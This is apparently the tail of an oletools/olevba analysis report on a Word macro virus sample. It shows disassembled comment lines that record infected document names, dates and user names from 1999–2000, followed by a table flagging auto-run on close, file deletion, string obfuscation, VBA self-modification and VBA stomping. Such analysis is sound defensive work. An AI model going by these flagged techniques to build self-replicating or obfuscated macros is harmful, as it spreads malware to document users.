' 	QuoteRem 0x0000 0x0008 " LSB.doc"
' Line #1019:
' Line #1020:
' 	QuoteRem 0x0000 0x0008 " PJH.doc"
' Line #1021:
' Line #1022:
' 	QuoteRem 0x0000 0x0008 " CZY.doc"
' Line #1023:
' Line #1024:
' 	QuoteRem 0x0000 0x000A " Document1"
' Line #1025:
' Line #1026:
' 	QuoteRem 0x0000 0x0013 " English script.doc"
' Line #1027:
' Line #1028:
' 	QuoteRem 0x0000 0x000A " 4050A.doc"
' Line #1029:
' Line #1030:
' 	QuoteRem 0x0000 0x000E " yuhuayuan.doc"
' Line #1031:
' Line #1032:
' 	QuoteRem 0x0000 0x0009 " 1965.doc"
' Line #1033:
' Line #1034:
' 	QuoteRem 0x0000 0x000D " Advances.doc"
' Line #1035:
' Line #1036:
' 	QuoteRem 0x0000 0x0011 " Garden Plaza.doc"
' Line #1037:
' Line #1038:
' 	QuoteRem 0x0000 0x0020 " 09:52:51 AM -Friday,19 Nov,1999"
' Line #1039:
' 	QuoteRem 0x0000 0x0004 " Lim"
' Line #1040:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1041:
' 	QuoteRem 0x0000 0x0013 " Garden Plaza_E.doc"
' Line #1042:
' Line #1043:
' 	QuoteRem 0x0000 0x0006 " 文档1"
' Line #1044:
' Line #1045:
' 	QuoteRem 0x0000 0x001D " 关于人力资源管历潸佝营蟻Edoc"
' Line #1046:
' Line #1047:
' 	QuoteRem 0x0000 0x0015 " 润发公寓预算方案.doc"
' Line #1048:
' Line #1049:
' 	QuoteRem 0x0000 0x001D " 上周工作报告（11。8~12）.doc"
' Line #1050:
' Line #1051:
' 	QuoteRem 0x0000 0x000F " 辞职蓙E丒丒doc"
' Line #1052:
' Line #1053:
' 	QuoteRem 0x0000 0x000B " 辞职蕘Edoc"
' Line #1054:
' Line #1055:
' 	QuoteRem 0x0000 0x0011 " 售后服务记录.doc"
' Line #1056:
' Line #1057:
' 	QuoteRem 0x0000 0x000E " 考勤说脕E.doc"
' Line #1058:
' Line #1059:
' 	QuoteRem 0x0000 0x000E " 人事说脕E.doc"
' Line #1060:
' Line #1061:
' 	QuoteRem 0x0000 0x000E " 考勤说脕E.doc"
' Line #1062:
' Line #1063:
' 	QuoteRem 0x0000 0x0011 " 仓库工作流程.doc"
' Line #1064:
' Line #1065:
' 	QuoteRem 0x0000 0x000B " REVIEW.DOC"
' Line #1066:
' Line #1067:
' 	QuoteRem 0x0000 0x000E " 工资说脕E.doc"
' Line #1068:
' Line #1069:
' 	QuoteRem 0x0000 0x0006 " 文档1"
' Line #1070:
' Line #1071:
' 	QuoteRem 0x0000 0x0020 " 上周工作报告（11.15~11.19）.doc"
' Line #1072:
' Line #1073:
' 	QuoteRem 0x0000 0x0006 " 文档1"
' Line #1074:
' Line #1075:
' 	QuoteRem 0x0000 0x0009 " 人事.doc"
' Line #1076:
' Line #1077:
' 	QuoteRem 0x0000 0x000D " 19991117.doc"
' Line #1078:
' Line #1079:
' 	QuoteRem 0x0000 0x000D " 单个模縼Edoc"
' Line #1080:
' Line #1081:
' 	QuoteRem 0x0000 0x000E " 公司简介E.doc"
' Line #1082:
' Line #1083:
' 	QuoteRem 0x0000 0x000D " Contract.doc"
' Line #1084:
' Line #1085:
' 	QuoteRem 0x0000 0x0010 " file002 (4).DOC"
' Line #1086:
' Line #1087:
' 	QuoteRem 0x0000 0x0011 " 周界报警器材.doc"
' Line #1088:
' Line #1089:
' 	QuoteRem 0x0000 0x000C " HuPrice.doc"
' Line #1090:
' Line #1091:
' 	QuoteRem 0x0000 0x000F " 产品装箱单.doc"
' Line #1092:
' Line #1093:
' 	QuoteRem 0x0000 0x000D " 使用鳃佝.doc"
' Line #1094:
' Line #1095:
' 	QuoteRem 0x0000 0x0012 " Gaoda Co. Ltd.doc"
' Line #1096:
' Line #1097:
' 	QuoteRem 0x0000 0x0019 " 上周技术开发情况汇报.doc"
' Line #1098:
' Line #1099:
' 	QuoteRem 0x0000 0x0012 " construct (1).doc"
' Line #1100:
' Line #1101:
' 	QuoteRem 0x0000 0x000C " account.doc"
' Line #1102:
' Line #1103:
' 	QuoteRem 0x0000 0x000E " Week Plan.doc"
' Line #1104:
' Line #1105:
' 	QuoteRem 0x0000 0x0013 " Humen Resource.doc"
' Line #1106:
' Line #1107:
' 	QuoteRem 0x0000 0x000B " 贵夫人.DOC"
' Line #1108:
' Line #1109:
' 	QuoteRem 0x0000 0x000D " 工艺文~1.DOC"
' Line #1110:
' Line #1111:
' 	QuoteRem 0x0000 0x0015 " Check and Accept.doc"
' Line #1112:
' Line #1113:
' 	QuoteRem 0x0000 0x000D " 工艺单~1.DOC"
' Line #1114:
' Line #1115:
' 	QuoteRem 0x0000 0x0008 " gz1.doc"
' Line #1116:
' Line #1117:
' 	QuoteRem 0x0000 0x000D " 贵妇人~2.DOC"
' Line #1118:
' Line #1119:
' 	QuoteRem 0x0000 0x000D " 贵夫人~1.DOC"
' Line #1120:
' Line #1121:
' 	QuoteRem 0x0000 0x000D " 贵妇人~1.DOC"
' Line #1122:
' Line #1123:
' 	QuoteRem 0x0000 0x000D " 贵妇人~3.DOC"
' Line #1124:
' Line #1125:
' 	QuoteRem 0x0000 0x000D " 贵妇人~4.DOC"
' Line #1126:
' Line #1127:
' 	QuoteRem 0x0000 0x000D " 贵妇人~5.DOC"
' Line #1128:
' Line #1129:
' 	QuoteRem 0x0000 0x000B " 贵妇人.DOC"
' Line #1130:
' Line #1131:
' 	QuoteRem 0x0000 0x0006 " 文档2"
' Line #1132:
' Line #1133:
' 	QuoteRem 0x0000 0x0006 " 文档1"
' Line #1134:
' Line #1135:
' 	QuoteRem 0x0000 0x0010 " file002 (4).DOC"
' Line #1136:
' Line #1137:
' 	QuoteRem 0x0000 0x000C " file003.DOC"
' Line #1138:
' Line #1139:
' 	QuoteRem 0x0000 0x0010 " file002 (4).DOC"
' Line #1140:
' Line #1141:
' 	QuoteRem 0x0000 0x0010 " file002 (4).DOC"
' Line #1142:
' Line #1143:
' 	QuoteRem 0x0000 0x000C " file002.DOC"
' Line #1144:
' Line #1145:
' 	QuoteRem 0x0000 0x0010 " file002 (5).DOC"
' Line #1146:
' Line #1147:
' 	QuoteRem 0x0000 0x0010 " file002 (5).DOC"
' Line #1148:
' Line #1149:
' 	QuoteRem 0x0000 0x0010 " file002 (5).DOC"
' Line #1150:
' Line #1151:
' 	QuoteRem 0x0000 0x0010 " file003 (1).DOC"
' Line #1152:
' Line #1153:
' 	QuoteRem 0x0000 0x000D " 工艺技~2.DOC"
' Line #1154:
' Line #1155:
' 	QuoteRem 0x0000 0x000D " 工艺技~1.DOC"
' Line #1156:
' Line #1157:
' 	QuoteRem 0x0000 0x000D " 工艺文~1.DOC"
' Line #1158:
' Line #1159:
' 	QuoteRem 0x0000 0x000D " 工艺文~2.DOC"
' Line #1160:
' Line #1161:
' 	QuoteRem 0x0000 0x000D " 工艺文档.DOC"
' Line #1162:
' Line #1163:
' 	QuoteRem 0x0000 0x0016 " CRT考勤仪通讯协襾Edoc"
' Line #1164:
' Line #1165:
' 	QuoteRem 0x0000 0x0013 " 富士通消嗫报竵Edoc"
' Line #1166:
' Line #1167:
' 	QuoteRem 0x0000 0x000D " 600巇條4.doc"
' Line #1168:
' Line #1169:
' 	QuoteRem 0x0000 0x0010 " file002 (6).DOC"
' Line #1170:
' Line #1171:
' 	QuoteRem 0x0000 0x0010 " file002 (7).DOC"
' Line #1172:
' Line #1173:
' 	QuoteRem 0x0000 0x0010 " file002 (7).DOC"
' Line #1174:
' Line #1175:
' 	QuoteRem 0x0000 0x0010 " file002 (7).DOC"
' Line #1176:
' Line #1177:
' 	QuoteRem 0x0000 0x000C " file004.DOC"
' Line #1178:
' Line #1179:
' 	QuoteRem 0x0000 0x0010 " file003 (3).DOC"
' Line #1180:
' Line #1181:
' 	QuoteRem 0x0000 0x0010 " file002 (7).DOC"
' Line #1182:
' Line #1183:
' 	QuoteRem 0x0000 0x000C " file002.DOC"
' Line #1184:
' Line #1185:
' 	QuoteRem 0x0000 0x0010 " file002 (8).DOC"
' Line #1186:
' Line #1187:
' 	QuoteRem 0x0000 0x000E " 考勤说脕E.doc"
' Line #1188:
' Line #1189:
' 	QuoteRem 0x0000 0x000C " file003.DOC"
' Line #1190:
' Line #1191:
' 	QuoteRem 0x0000 0x000C " file004.DOC"
' Line #1192:
' Line #1193:
' 	QuoteRem 0x0000 0x000E " file_ (1).doc"
' Line #1194:
' Line #1195:
' 	QuoteRem 0x0000 0x000E " file_ (1).doc"
' Line #1196:
' Line #1197:
' 	QuoteRem 0x0000 0x000C " 文档bak.doc"
' Line #1198:
' Line #1199:
' 	QuoteRem 0x0000 0x000F " to Mr. Zhu.doc"
' Line #1200:
' Line #1201:
' 	QuoteRem 0x0000 0x0008 " fax.doc"
' Line #1202:
' Line #1203:
' 	QuoteRem 0x0000 0x000C " Archive.doc"
' Line #1204:
' Line #1205:
' 	QuoteRem 0x0000 0x000D " Product3.doc"
' Line #1206:
' Line #1207:
' 	QuoteRem 0x0000 0x000D " 移交报竵Edoc"
' Line #1208:
' Line #1209:
' 	QuoteRem 0x0000 0x0011 " 工程安装协襾Edoc"
' Line #1210:
' Line #1211:
' 	QuoteRem 0x0000 0x000D " 工程合同.doc"
' Line #1212:
' Line #1213:
' 	QuoteRem 0x0000 0x000B " 决算眮Edoc"
' Line #1214:
' Line #1215:
' 	QuoteRem 0x0000 0x0011 " 系统工程消嗫.doc"
' Line #1216:
' Line #1217:
' 	QuoteRem 0x0000 0x0011 " 周界报警器材.doc"
' Line #1218:
' Line #1219:
' 	QuoteRem 0x0000 0x0016 " 关于PTD的补充协襾Edoc"
' Line #1220:
' Line #1221:
' 	QuoteRem 0x0000 0x0021 " 第三代保安电子巡竵E低矴S1000.doc"
' Line #1222:
' Line #1223:
' 	QuoteRem 0x0000 0x000A " XIEYI.doc"
' Line #1224:
' Line #1225:
' 	QuoteRem 0x0000 0x000E " 工程合同1.doc"
' Line #1226:
' Line #1227:
' 	QuoteRem 0x0000 0x000A " donwu.doc"
' Line #1228:
' Line #1229:
' 	QuoteRem 0x0000 0x0010 " XIEYI（DW）.doc"
' Line #1230:
' Line #1231:
' 	QuoteRem 0x0000 0x0013 " 吴县市东吴花园.doc"
' Line #1232:
' Line #1233:
' 	QuoteRem 0x0000 0x0015 " 东吴花园周界报警.doc"
' Line #1234:
' Line #1235:
' 	QuoteRem 0x0000 0x0011 " 东吴花园方案.doc"
' Line #1236:
' Line #1237:
' 	QuoteRem 0x0000 0x000A " 总詠E?doc"
' Line #1238:
' Line #1239:
' 	QuoteRem 0x0000 0x000E " 润发方案1.doc"
' Line #1240:
' Line #1241:
' 	QuoteRem 0x0000 0x000F " 产品报价单.doc"
' Line #1242:
' Line #1243:
' 	QuoteRem 0x0000 0x0013 " 功能比较、分蝸Edoc"
' Line #1244:
' Line #1245:
' 	QuoteRem 0x0000 0x0015 " 公司以往消嗫简絹Edoc"
' Line #1246:
' Line #1247:
' 	QuoteRem 0x0000 0x0009 " 函竵Edoc"
' Line #1248:
' Line #1249:
' 	QuoteRem 0x0000 0x0008 " ygy.doc"
' Line #1250:
' Line #1251:
' 	QuoteRem 0x0000 0x000B " 交验单.doc"
' Line #1252:
' Line #1253:
' 	QuoteRem 0x0000 0x000D " 佳安函竵Edoc"
' Line #1254:
' Line #1255:
' 	QuoteRem 0x0000 0x0011 " 滨河花园方案.doc"
' Line #1256:
' Line #1257:
' 	QuoteRem 0x0000 0x000D " 东吴合同.doc"
' Line #1258:
' Line #1259:
' 	QuoteRem 0x0000 0x001F " 苏州新馨置地有限公司（gx）.doc"
' Line #1260:
' Line #1261:
' 	QuoteRem 0x0000 0x0011 " 馨都二期方案.doc"
' Line #1262:
' Line #1263:
' 	QuoteRem 0x0000 0x0023 " 三星苑住宅小区安全技术防范方案.doc"
' Line #1264:
' Line #1265:
' 	QuoteRem 0x0000 0x000D " 樱缘方案.doc"
' Line #1266:
' Line #1267:
' 	QuoteRem 0x0000 0x0017 " 东吴方案（含合同）.doc"
' Line #1268:
' Line #1269:
' 	QuoteRem 0x0000 0x000C " 嘉怡苑2.doc"
' Line #1270:
' Line #1271:
' 	QuoteRem 0x0000 0x0023 " 三星苑住宅小区安全技术防范方案.doc"
' Line #1272:
' Line #1273:
' 	QuoteRem 0x0000 0x000C " Joe Lee.doc"
' Line #1274:
' Line #1275:
' 	QuoteRem 0x0000 0x001D " TY ECU愝掕婍僥僗僩巇條彂.doc"
' Line #1276:
' Line #1277:
' 	QuoteRem 0x0000 0x001D " TY ECU愝掕婍僥僗僩巇條彂.doc"
' Line #1278:
' Line #1279:
' 	QuoteRem 0x0000 0x000C " Joe Lee.doc"
' Line #1280:
' Line #1281:
' 	QuoteRem 0x0000 0x000C " Joe Lee.doc"
' Line #1282:
' Line #1283:
' 	QuoteRem 0x0000 0x000E " file_ (1).doc"
' Line #1284:
' Line #1285:
' 	QuoteRem 0x0000 0x0009 " file.doc"
' Line #1286:
' Line #1287:
' 	QuoteRem 0x0000 0x0006 " 文档1"
' Line #1288:
' Line #1289:
' 	QuoteRem 0x0000 0x000C " EResume.doc"
' Line #1290:
' Line #1291:
' 	QuoteRem 0x0000 0x000C " CResume.doc"
' Line #1292:
' Line #1293:
' 	QuoteRem 0x0000 0x000B " readme.doc"
' Line #1294:
' Line #1295:
' 	QuoteRem 0x0000 0x000B " Sample.doc"
' Line #1296:
' Line #1297:
' 	QuoteRem 0x0000 0x000E " Contract1.DOC"
' Line #1298:
' Line #1299:
' 	QuoteRem 0x0000 0x0015 " 向隆塑胶预算方案.doc"
' Line #1300:
' Line #1301:
' 	QuoteRem 0x0000 0x0010 " 市区address.doc"
' Line #1302:
' Line #1303:
' 	QuoteRem 0x0000 0x0019 " 协  襾E 书（欧莱雅）.doc"
' Line #1304:
' Line #1305:
' 	QuoteRem 0x0000 0x000F " 安德鲁电信.doc"
' Line #1306:
' Line #1307:
' 	QuoteRem 0x0000 0x000D " 百得合同.doc"
' Line #1308:
' Line #1309:
' 	QuoteRem 0x0000 0x000D " 本周计划.doc"
' Line #1310:
' Line #1311:
' 	QuoteRem 0x0000 0x0011 " 新产品报价单.doc"
' Line #1312:
' Line #1313:
' 	QuoteRem 0x0000 0x0011 " 合作框架协襾Edoc"
' Line #1314:
' Line #1315:
' 	QuoteRem 0x0000 0x000F " Product1_0.doc"
' Line #1316:
' Line #1317:
' 	QuoteRem 0x0000 0x000B " 199922.doc"
' Line #1318:
' Line #1319:
' 	QuoteRem 0x0000 0x0010 " 常蕘Eddress.doc"
' Line #1320:
' Line #1321:
' 	QuoteRem 0x0000 0x000F " 威尼斯方案.doc"
' Line #1322:
' Line #1323:
' 	QuoteRem 0x0000 0x000B " Sample.doc"
' Line #1324:
' Line #1325:
' 	QuoteRem 0x0000 0x000E " Contract1.DOC"
' Line #1326:
' Line #1327:
' 	QuoteRem 0x0000 0x000E " Throwaway.doc"
' Line #1328:
' Line #1329:
' 	QuoteRem 0x0000 0x000A " Price.doc"
' Line #1330:
' Line #1331:
' 	QuoteRem 0x0000 0x0019 " Contract for Service.doc"
' Line #1332:
' Line #1333:
' 	QuoteRem 0x0000 0x000E " Contract2.DOC"
' Line #1334:
' Line #1335:
' 	QuoteRem 0x0000 0x000E " Database8.doc"
' Line #1336:
' Line #1337:
' 	QuoteRem 0x0000 0x000B " Tables.DOC"
' Line #1338:
' Line #1339:
' 	QuoteRem 0x0000 0x0009 " 封脕Edoc"
' Line #1340:
' Line #1341:
' 	QuoteRem 0x0000 0x0009 " 文档.doc"
' Line #1342:
' Line #1343:
' 	QuoteRem 0x0000 0x000C " 高磥E��?doc"
' Line #1344:
' Line #1345:
' 	QuoteRem 0x0000 0x000D " 面试考虂Edoc"
' Line #1346:
' Line #1347:
' 	QuoteRem 0x0000 0x000D " 人力资源.doc"
' Line #1348:
' Line #1349:
' 	QuoteRem 0x0000 0x0009 " 封脕Edoc"
' Line #1350:
' Line #1351:
' 	QuoteRem 0x0000 0x000A " 封脕E.doc"
' Line #1352:
' Line #1353:
' 	QuoteRem 0x0000 0x0012 " 人力资源封脕E.doc"
' Line #1354:
' Line #1355:
' 	QuoteRem 0x0000 0x0007 " O1.doc"
' Line #1356:
' Line #1357:
' 	QuoteRem 0x0000 0x000D " Company1.doc"
' Line #1358:
' Line #1359:
' 	QuoteRem 0x0000 0x000C " Product.doc"
' Line #1360:
' Line #1361:
' 	QuoteRem 0x0000 0x000D " Product1.DOC"
' Line #1362:
' Line #1363:
' 	QuoteRem 0x0000 0x000D " Product1.doc"
' Line #1364:
' Line #1365:
' 	QuoteRem 0x0000 0x000F " Product1_0.doc"
' Line #1366:
' Line #1367:
' 	QuoteRem 0x0000 0x000F " Packaging1.doc"
' Line #1368:
' Line #1369:
' 	QuoteRem 0x0000 0x000C " Advert1.doc"
' Line #1370:
' Line #1371:
' 	QuoteRem 0x0000 0x0007 " IT.doc"
' Line #1372:
' Line #1373:
' 	QuoteRem 0x0000 0x0011 " 考勤系统简絹Edoc"
' Line #1374:
' Line #1375:
' 	QuoteRem 0x0000 0x000D " 公司介绍.doc"
' Line #1376:
' Line #1377:
' 	QuoteRem 0x0000 0x0011 " 公 司 絹E绍1.doc"
' Line #1378:
' Line #1379:
' 	QuoteRem 0x0000 0x0014 " 高磥E记诩�成系�?doc"
' Line #1380:
' Line #1381:
' 	QuoteRem 0x0000 0x0009 " Test.doc"
' Line #1382:
' Line #1383:
' 	QuoteRem 0x0000 0x0009 " Task.doc"
' Line #1384:
' Line #1385:
' 	QuoteRem 0x0000 0x000D " Rlzyxsjh.doc"
' Line #1386:
' Line #1387:
' 	QuoteRem 0x0000 0x0022 " 03:25:32 屵屻 -Sunday,13 Feb,2000"
' Line #1388:
' 	QuoteRem 0x0000 0x0005 " Wuxb"
' Line #1389:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1390:
' 	QuoteRem 0x0000 0x000D " Rlzyxsjh.doc"
' Line #1391:
' Line #1392:
' 	QuoteRem 0x0000 0x000A " Price.doc"
' Line #1393:
' Line #1394:
' 	QuoteRem 0x0000 0x0009 " xsjh.doc"
' Line #1395:
' Line #1396:
' 	QuoteRem 0x0000 0x0017 " 俻倀俙俢楢棈彂0213.doc"
' Line #1397:
' Line #1398:
' 	QuoteRem 0x0000 0x0017 " 俻倀俙俢楢棈彂0213.doc"
' Line #1399:
' Line #1400:
' 	QuoteRem 0x0000 0x0017 " 俻倀俙俢楢棈彂0213.doc"
' Line #1401:
' Line #1402:
' 	QuoteRem 0x0000 0x0017 " 俻倀俙俢楢棈彂0213.doc"
' Line #1403:
' Line #1404:
' 	QuoteRem 0x0000 0x0020 " 09:36:47 PM -Sunday,13 Feb,2000"
' Line #1405:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #1406:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #1407:
' 	QuoteRem 0x0000 0x000B " VIRUS1.DOC"
' Line #1408:
' Line #1409:
' 	QuoteRem 0x0000 0x0009 " Doc3.doc"
' Line #1410:
' Line #1411:
' 	QuoteRem 0x0000 0x0009 " Doc2.doc"
' Line #1412:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

